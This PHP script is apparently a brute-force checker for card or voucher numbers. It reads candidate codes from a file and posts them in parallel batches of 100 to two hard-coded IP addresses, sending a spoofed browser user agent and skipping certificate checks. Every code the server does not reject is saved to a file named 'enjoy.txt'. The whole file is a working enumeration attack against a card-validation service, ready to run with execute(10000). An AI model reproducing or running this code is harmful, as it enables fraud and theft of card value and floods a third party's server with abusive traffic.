<?php
set_time_limit(0);
// function randPass($length, $strength=8) {
//     $vowels = 'aeuy';
//     $consonants = 'bdghjmnpqrstvz';
//     if ($strength >= 1) {
//         $consonants .= 'BDGHJLMNPQRSTVWXZ';
//     }
//     if ($strength >= 2) {
//         $vowels .= "AEUY";
//     }
//     if ($strength >= 4) {
//         $consonants .= '0123456789';
//     }
//     if ($strength >= 8) {
//         $consonants .= '-=+.';
//     }

//     $password = '';
//     $alt = time() % 2;
//         for ($i = 0; $i < $length; $i++) {
//             if ($alt == 1) {
//                 $password .= $consonants[(rand() % strlen($consonants))];
//                 $alt = 0;
//             } else {
//                 $password .= $vowels[(rand() % strlen($vowels))];
//                 $alt = 1;
//             }
//         }
//     return $password;   
// }

// function generateRandom($length = 10) {

//     $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';

//     $specials = '=+-_.';

//     $charactersLength = strlen($characters);

//     $randomString = '';

//     // Removed one from length to maintain desired length

//     // for special character addition

//     for ($i = 0; $i < $length - 1; $i++) {

//         $randomString .= $characters[rand(0, $charactersLength - 1)];

//     }

//     // Add the special character:

//     $randomString .= $specials[rand(0, strlen($specials) - 1)];

//     // Shuffle the returned string so the special is not always at the end

//     return str_shuffle($randomString);

// }

// function genCodes($number){
//     $code_no = array();
//     while(count($code_no)<=$number){
//         $codeX = randPass(14);
//         // $codeX = generateRandom(14);

//         if(preg_match('/[^A-Za-z0-9]/', $codeX)){
//             if(getLineWithString($codeX) == -1){
//                 array_push($code_no,'S'.$codeX);
//                 $file = fopen('codes.txt', 'a+');
//                 fwrite($file, 'S'.$codeX.PHP_EOL);
//                 fclose($file);
//             }
//         }
//     }
// }

// function getLineWithString($str) {
//     $lines = file('codes.txt');  
//     if($lines !== ''){
//         foreach ($lines as $line) {
//             if (strpos($line, $str) !== false) {
//                 return $line;
//             }
//         }
//     }
//     return -1;
// }

function api($checkCodes){
    $url = 'http://45.91.82.31/';
    // $url = 'http://194.124.216.122/';
    foreach($checkCodes as $code){
        $post_data['card_no'] = $code;
        $post_data['submit'] = 'query';
        $post_data['action'] = 'yes';
        $post_data['check_valid'] = 'yes';

        //traverse array and prepare data for posting (key1=value1)
        foreach ( $post_data as $key => $value) {
            $post_items[] = $key . '=' . $value;
        }
        //create the final string to be posted using implode()
        $payload = implode ('&', $post_items);

        //create cURL connection
        $curl_connection =  curl_init($url);
        //set options
        curl_setopt($curl_connection, CURLOPT_CONNECTTIMEOUT, 10000);
        curl_setopt($curl_connection, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)");
        curl_setopt($curl_connection, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl_connection, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($curl_connection, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($curl_connection, CURLOPT_RETURNTRANSFER, 1 );

        //try params for fast curl
        // curl_setopt($curl_connection, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4 );
        // curl_setopt($curl_connection, CURLOPT_TCP_FASTOPEN, true); 

        //set data to be posted
        curl_setopt($curl_connection, CURLOPT_POSTFIELDS, $payload);

        //perform our request
        $response = curl_exec($curl_connection);
        //close the connection
        curl_close($curl_connection);
        $start = stripos($response, "document.getElementById('prompt').innerHTML");
        $end = stripos($response, "</body>");
        $body = substr($response,$start+46,$end-$start);
        
        if(!stripos($body,'Error,Card_NO does not exist') && !stripos($body,'Error,Invalid Card_NO')){
            $myfile = fopen("enjoy.txt", "a") or die("Unable to open file!");
            fwrite($myfile, $code.':'.$body);
            fclose($myfile);
        }

        print_r(['code'=>$code,'status'=>$body]);
        echo '<br>';
    }
}

function php_curl_multi($codes){

    $urls = array(
        'http://45.91.82.31/',
        'http://194.124.216.122/',
    );
    $keyUrl = array_rand($urls);
    $url = $urls[$keyUrl];

    $ch_index = array(); // store all curl init
    $response = array();

    // create both cURL resources
    foreach ($codes as $key => $code) {
        $post_data['card_no'] = trim($code);
        $post_data['submit'] = 'query';
        $post_data['action'] = 'yes';
        $post_data['check_valid'] = 'yes';
    
        //traverse array and prepare data for posting (key1=value1)
        foreach ( $post_data as $key => $value) {
            $post_items[] = $key . '=' . $value;
        }
        //create the final string to be posted using implode()
        $payload = implode ('&', $post_items);

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5000);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
        curl_setopt($ch, CURLOPT_HEADER, 0);
        // curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4 );
        // curl_setopt($ch, CURLOPT_TCP_FASTOPEN, true);
        $ch_index[] = $ch;
    }

    //create the multiple cURL handle
    $mh = curl_multi_init();

    //add the handles
    foreach ($ch_index as $key => $ch) {
        curl_multi_add_handle($mh,$ch);
    }

    //execute the multi handle
    do {
        $status = curl_multi_exec($mh, $active);
        if ($active) {
            curl_multi_select($mh);
        }
    } while ($active && $status == CURLM_OK);

    //close the handles
    foreach ($ch_index as $key => $ch) {
        curl_multi_remove_handle($mh, $ch);
    }
    curl_multi_close($mh);
    
    // get all response
    foreach ($ch_index as $key => $ch) {
        $response[] = curl_multi_getcontent($ch);
    }

    return $response;
}

function incrementCounter($newCounter){
    $newContent = implode("\n", $newCounter);
    $fp = fopen('counter.txt', "w+");   // w+ means create new or replace the old file-content
    fputs($fp, $newContent);
    fclose($fp);
}

function execute($number=0){
    $file = file('codes.txt');
    $fileCounter = file('counter.txt');
    if($number != 0) $setNum = $number;
    if($number == 0) $setNum = count($file);
    $startNum = $fileCounter[0] ?? 0;
    $endNum = $startNum + $setNum;
    // echo 'Start from: '.$fileCounter[0].' to '.$endNum.PHP_EOL;
    $checkCodes = array();
    for($i=$startNum;$i<$endNum;$i++){
        array_push($checkCodes,$file[$i]);
    }

    $multiArrayCode = array_chunk($checkCodes, 100);
    foreach ($multiArrayCode as $key => $codes) {
        $response = php_curl_multi($codes);
        foreach ($response as $key => $value) {
            $start = stripos($value, "document.getElementById('prompt').innerHTML");
            $end = stripos($value, "</body>");
            $body = substr($value,$start+46,$end-$start);
            if($body == ''){
                $myfile = fopen("codes.txt", "a") or die("Unable to open file!");
                fwrite($myfile, $codes[$key]);
                fclose($myfile);
            }
            if(!stripos($body,'Error,Card_NO does not exist') && !stripos($body,'Error,Invalid Card_NO')){
                $myfile = fopen("enjoy.txt", "a") or die("Unable to open file!");
                fwrite($myfile, $codes[$key].':'.$body);
                fclose($myfile);
            }
            print_r(['code'=>$codes[$key],'status'=>$body]);
            echo '<br>';
        }
        // Remove first line
        array_shift($fileCounter);
        // Add the new line to the beginning
        array_unshift($fileCounter, $startNum + 100);
        // Write the file back
        incrementCounter($fileCounter);
    }

    

}

execute(10000);

